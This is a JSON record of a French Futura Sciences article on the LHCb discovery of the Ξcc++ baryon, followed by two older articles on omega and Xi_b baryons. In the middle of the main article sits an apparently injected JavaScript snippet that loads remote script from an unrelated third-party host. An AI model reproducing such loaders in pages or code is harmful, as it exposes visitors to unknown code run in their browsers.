{"title": "Une nouvelle particule découverte au LHC !", "newspaper": "Futura Sciences", "author": "Laurent Sacco", "date_publi": "10/07/2017", "content": "Une nouvelle particule vient d'être mise en évidence au Cern grâce aux données collectées par le détecteur LHCb. Il s'agit d'un baryon. Prédit de longue date par le modèle standard, celui-ci n'en est pas moins exotique : il contient deux quarks lourds et possède deux fois la charge électrique du proton... Ce qu'il faut retenir Prédit par le modèle standard de longue date, le baryon Ξ cc ++  n'avait encore jamais été observé, ce qui est maintenant chose faite grâce au détecteur LHCb, au Cern. Formé de trois quarks, c'est le premier mis en évidence avec deux quarks lourds, en l'occurrence des quarks charmés (notés cc). C'est également un baryon exotique parce qu'il possède deux fois la charge d'un proton (++). Il va servir de laboratoire pour affiner les calculs du modèle standard. Cela pourrait permettre de découvrir des effets fins qui, ailleurs, ne relèvent pas de ce modèle. LHC : comment fonctionne le plus grand accélérateur de particules ?                       À cheval entre la France et la Suisse, le Grand collisionneur de hadrons permet actuellement de faire des collisions de protons à une énergie de 13 TeV (téraélectronvolts). Découvrez le fonctionnement de cet impressionnant outil en vidéo grâce au Cern.                                       Cela fait plus d'un mois que la collecte de données pour faire de la  physique  avec des faisceaux de protons a repris au  LHC . Tout récemment, le Cern a par ailleurs annoncé qu'un nouveau record de  luminosité  avait été atteint. Le nombre de collisions avec une  énergie  disponible à chaque fois de 13 Tev (ce qui permettrait en théorie la création d'environ 13.000 nouveaux protons pour chaque collision de deux protons) a donc fait un nouveau bond, ce qui augmente les chances d'observer un évènement intéressant. Pourtant, l'un des buts du LHC ne concerne pas la découverte d'une nouvelle physique mais tout simplement l'exploration du contenu des  équations  de celles que l'on connaît déjà, à savoir le modèle électrofaible et, surtout, celui de la  chromodynamique quantique  (QCD), qui contient le fameux  modèle des quarks , dont on a fêté le cinquantenaire il y a quelques années. Une présentation de la collaboration LHCb au Cern. Pour obtenir une traduction en français assez fidèle, cliquez sur le rectangle blanc en bas à droite. Les sous-titres en anglais apparaissent alors. Cliquez ensuite sur la roue dentée à droite du rectangle, puis sur « Sous-titres » et enfin sur « Traduire automatiquement ». Choisissez « Français ». © Cern, YouTube  Deux quarks charmés et un quark up À cet égard, les membres de l'expérience LHCb ont un beau tableau de chasse à leur actif. Ils annoncent en effet régulièrement la découverte de  nouveaux hadrons . Ainsi, en ce début de mois de juillet, ils ont annoncé la mise en évidence d'un nouveau  baryon  Xi ( Ξ ).  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Celui-ci contient trois  quarks  : deux  quarks charmés  (quarks c) et un quark haut ( quark up , ou u, en anglais). Chacun de ces quarks  porte  une charge valant deux tiers de la charge élémentaire d'un  électron . Cet hadron est donc quelque peu  exotique  puisque sa charge est deux fois celle d'un  proton  et qu'il contient deux quarks lourds charmés, d'où sa désignation technique :  Ξ cc ++ . Ce baryon n'en était pas moins prédit de longue date par le modèle des quarks des années 1970, qui en contient 6 au lieu des 3 postulés au début des années 1960. Pouvant s'assembler par deux ou trois essentiellement, ces particules, et leurs  antiparticules , permettent donc un riche zoo dont l'exploration n'est pas encore terminée. Le nouveau baryon doublement chargé contient deux quarks charmés et un quark up liés par des courants de gluons, les photons de la force nucléaire forte. © Cern                               Un nouveau laboratoire pour explorer les équations de la QCD La  masse  du  Ξ cc ++  est d'environ 3.621 MeV, soit presque 4 fois celle d'un proton. Nous disons bien « environ » car cette particule étant instable et régie par les lois de la  mécanique quantique , l'une des  inégalités de Heisenberg  (celle portant sur le temps et l'énergie) implique, en conséquence, qu'on ne peut pas attribuer à cette particule une masse absolument exacte. On sait par contre qu'un de ses modes de désintégration se fait en donnant un baryon Λ c +  et trois  mésons  plus légers, respectivement un kaon et deux pions : K - , π +  et π + . C'est d'ailleurs ce canal de désintégration qui a permis l'identification du  Ξ cc ++ . Le signal obtenu dans le détecteur est de 12 sigma, selon le jargon des scientifiques, ce qui veut dire qu'il s'agit d'une découverte particulièrement  solide  et incontestable. La statistique accumulée provient des deux campagnes d'observation du LHC, c'est-à-dire qu'elle combine des évènements déjà collectés il y a des années, avec des collisions à 8 TeV, et ceux obtenus en 2016, avec une énergie et une  luminosité  accrues. Spectre de masse Λ c +  K -  π +  π +  montrant un pic à 3.621 Mev correspondant à la particule Ξ cc ++ . © LHCb                               La désintégration du  Ξ cc ++  est « lente », si l'on peut dire. Cela signifie qu'elle se produit sous l'effet d'une  interaction faible . Elle est donc du ressort de la  théorie électrofaible  et non pas du ressort de la QCD ou de la QED ( électrodynamique quantique ). Par contre, la description des caractéristiques de ce baryon requiert bien aussi les équations de la chromodynamique quantique (ces équations sont notoirement difficiles à résoudre dans le domaine non perturbatif, où elles sont  non linéaires , et c'est pour cette raison que le calcul  ab initio  de la  masse du proton et du neutron  requiert des  ordinateurs ). Le  Ξ cc ++  est un laboratoire intéressant pour tester et affiner les prédictions de la QCD et, donc, indirectement, mettre en évidence des écarts subtils dans d'autres phénomènes qui relèvent de celle-ci et qui pourraient trahir l'existence d'une nouvelle physique. C'est ce qu'exprime le commentaire suivant de Giovanni Passaleva, porte-parole de la collaboration LHCb : «  Le fait d'avoir trouvé un nouveau baryon, contenant deux quarks lourds, présente un grand intérêt car celui-ci nous offre un outil exceptionnel pour sonder plus avant la chromodynamique quantique, à savoir la théorie décrivant l' interaction forte , l'une des quatre forces fondamentales .  Ces particules nous aideront par conséquent à améliorer la capacité prédictive de nos théories  ». Son prédécesseur, Guy Wilkinson, ajoute : «  Contrairement aux autres baryons, dans lesquels les trois quarks effectuent une danse subtile les uns autour des autres, un baryon à deux quarks lourds devrait se comporter comme un système planétaire, où les deux quarks lourds jouent le rôle d' étoiles  lourdes en  orbite  l'une autour de l'autre, le quark léger étant, lui, en orbite autour de ce  système binaire  ».  Pour en savoir plus 5 baryons oméga découverts grâce à l'expérience LHCb Article de  Laurent Sacco  publié le 22/03/2017 L'expérience LHCb utilise l'un des quatre détecteurs géants dédiés à l'étude des collisions de protons au LHC. Les physiciens qui y travaillent viennent à nouveau d'annoncer la découverte de nouvelles particules : cinq baryons oméga du  modèle standard . Depuis plus de 50 ans maintenant, les physiciens se rassemblent pour faire le point sur les dernières découvertes en physique fondamentale à l'occasion des  Rencontres de Moriond . Elles se déroulent en ce moment à La Thuile (Italie), dans une ambiance agréable, relaxée et conviviale, permettant à de jeunes chercheurs de discuter directement avec les leaders de leurs domaines. Il se pourrait qu'on y parle des premiers signes de l'existence d'une nouvelle physique débusquée dans les dernières données recueillies au LHC... En attendant, le Cern a annoncé que l'un des détecteurs géants du Grand collisionneur de  hadrons , LHCb, avait observé, lors d'une seule expérience, cinq nouvelles particules. Les nouvelles particules sont prévues par le modèle standard Il s'agit en fait de baryons dont l'existence peut être prédite à partir du modèle standard, plus précisément de la chromodynamique quantique et de la théorie des quarks. Il s'agit même d' états excités  (de  résonances  dans le jargon des physiciens) d'un membre d'une famille de particules déjà connues, les baryons oméga. Rappelons que les baryons oméga, formés de trois quarks, ne contiennent aucun de ceux qui constituent les protons et les neutrons, à savoir les quarks « u » et « d » (sauf fugacement, en tant que fluctuations du vide quantique). Le premier de ces baryons à avoir été découvert est le baryon Ω − . Il avait été prédit théoriquement en 1961 par Murray Gell-Mann et indépendamment par Yuval Ne'eman, un colonel de l'armée israélienne venu tard à la physique, en utilisant des arguments de  symétrie  basés sur le fameux groupe de Lie SU(3). Cela allait les conduire finalement à la découverte de la  théorie des quarks . La découverte du premier baryon oméga avec des commentaires de Feynman, Gell-Mann, Ne'eman. Pour obtenir une traduction en français assez fidèle, cliquez sur le rectangle blanc en bas à droite. Les sous-titres en anglais devraient alors apparaître. Cliquez ensuite sur l'écrou à droite du rectangle, puis sur « Sous-titres » et enfin sur « Traduire automatiquement ». Choisissez « Français ». © YouTube Le baryon Ω −  a été observé en 1964. Il est chargé négativement, d'où le « - », et est composé de trois  quarks étranges  (des quarks dits « s »). Comme ils l'expliquent dans un article déposé sur  arXiv , les chercheurs du Cern ont, eux, découvert les baryons Ω c (3000) 0 , Ω c (3050) 0 , Ω c (3066) 0 , Ω c (3090) 0  et Ω c (3119) 0 . Les nombres en parenthèses donnent les masses respectives des particules en mégaélectronvolts (MeV), mesurées par LHCb. Ce sont en quelque sorte les équivalents d' atomes  d' hydrogène  à des énergies différentes du fait que l'électron se trouve sur des niveaux d'énergie distincts. La découverte de nouvelles particules avec des détecteurs peut être comparée à la réception d'une gamme de fréquences par un poste de radio. Au sein du bruit de fond, le signal produit une résonance dans le récepteur lorsqu’il est calé sur la bonne fréquence. Comme le montre ce schéma, ces cinq nouvelles particules dans le détecteur LHCb se présentent comme cinq « résonances », en rouge, au-dessus du bruit de fond, pour des énergies associées à des masses. © Collaboration LHCb                               Ces baryons sont très instables, donc ils se désintègrent rapidement. Leur étude pourrait nous aider à mieux comprendre le contenu des équations de la chromodynamique quantique et peut-être d'y voir une nouvelle physique à l'œuvre. Le LHC sur les traces d'une nouvelle physique Article de Laurent Sacco publié le 21/11/2014  Le Cern fête en 2014 ses 60 ans et c'est un beau cadeau d'anniversaire que viennent de lui offrir les membres de la collaboration LHCb qui utilisent l'un des quatre grands détecteurs de particules du LHC : deux nouveaux baryons. Ils avaient été prédits dans le cadre du modèle standard et devraient aider à découvrir des traces d'une nouvelle physique. Depuis quelques années, l'Europe apparaît comme à la tête de plusieurs domaines scientifiques qui ont longtemps été l'apanage des États-Unis au niveau mondial. Il y a bien sûr les missions  Planck  et Herschel en ce qui concerne la  cosmologie  et l' astrophysique  et plus récemment l'extraordinaire performance de la mission  Rosetta . On peut citer aussi le  Human Brain Project , qualifié de véritable Cern des neurosciences. Le  Cern  lui-même vient de fêter les 60 ans de sa naissance officielle comme organisme de recherche en physique des hautes énergies au niveau européen. Il y a 50 ans, l'un de ses chercheurs, George Zweig, découvrait indépendamment de Murray Gell-Mann le  modèle des quarks , qui a conduit presque 10 ans plus tard à la découverte des équations de la chromodynamique quantique (la QCD) expliquant la force nucléaire forte, et sur lequel s'est bâti aussi le modèle électrofaible ayant conduit à la mise en évidence du  boson de Brout-Englert-Higgs  avec le LHC. Un autre chercheur du Cern,  John Bell , publiait aussi en 1964 un article que l'on peut considérer comme l'un des plus influents pour la naissance des travaux dans le domaine de l'information quantique. Des membres de la famille des baryons Xi Ces multiples anniversaires viennent de s'accompagner d'une publication sur  arxiv  par les membres de la collaboration LHCb. Ce détecteur a plus spécifiquement pour mission de nous éclairer sur les mystères de l' antimatière  via des mesures sur la  violation de la symétrie CP  en étudiant des hadrons contenant des  mésons b . Mais comme l'annoncent les physiciens qui l'utilisent pour leurs expériences, il leur a permis de découvrir deux nouvelles particules appelées Xi b -  et Xi b * - , qui avaient été prédites par le modèle des quarks, mais qui n'avaient jamais été observées jusqu'ici. La découverte de nouvelles particules avec des détecteurs peut être comparée à l’utilisation d’un poste de radio pour capter un canal d’émission. Il existe un bruit de fond au-dessus duquel le signal radio produit ce qu’on appelle une résonance dans le poste récepteur lorsqu’il est calé sur la fréquence de l’émetteur. Comme le montre ce schéma, la découverte de deux nouvelles particules dans le détecteur LHCb se présente comme deux « résonances » en bleu au-dessus du bruit de fond, en rouge pour des énergies associées à des masses. © Cern                               Un tremplin pour chasser de la nouvelle physique Il ne s'agit donc pas d'une preuve de l'existence d'une nouvelle physique, bien que le LHCb ait fourni quelques indications intrigantes de l'existence d'un  boson Z'  en 2013. Il ne s'agit pas non plus d' hadrons exotiques  comme ceux qui ont aussi été découverts en analysant les produits des collisions de protons dans LHCb avant que le LHC ne soit arrêté pour que ses capacités soient améliorées. Il s'agit de baryons qui appartiennent à une famille de particules composées de trois quarks, les baryons Xi, et donc un nouveau membre le Xi b * 0 , avait déjà été observée en 2012 par l'expérience CMS. Les deux nouveaux baryons ont une masse d'environ 6 fois celle du proton et ils contiennent chacun un quark b, un quark s et un  quark d . Mais tout comme les niveaux d'énergie des électrons dans un atome peuvent différer en raison de l'état de  spin  de l'électron dans l'atome, ces deux baryons n'ont pas la même énergie de masse parce que dans le cas du Xi b - , les spins des deux quarks les plus légers sont de sens opposés à celui du quark b, tandis que dans l'état Xi b * - , ils sont de même sens. Ils constituent de nouveaux laboratoires permettant de tester les prédictions de la QCD qui sont parfois impossibles à obtenir sans l'aide d'un  ordinateur  étant donné les équations non linéaires qui sont à la base de la théorie. Pour ceux qui attendaient du LHC, la découverte de particules de  matière noire  ou encore de  minitrous noirs , ces deux nouvelles particules, qui semblent tout à fait conformes aux prédictions du modèle standard, apparaissent sûrement comme quelque peu insipides. Toutefois, comme le rappelle Patrick Koppenburg, coordinateur pour la physique de LHCb, de l'institut Nikhef, à Amsterdam :  « Si nous voulons découvrir une nouvelle physique au-delà du modèle standard, nous devons d'abord en avoir une image nette. Ces études de haute précision nous aideront à faire la différence, à l'avenir, entre des effets relevant du modèle standard et tout élément nouveau ou imprévu ». Le  LHC  devrait repartir à la chasse à de la nouvelle physique au printemps 2015. ", "theme": "sciences"}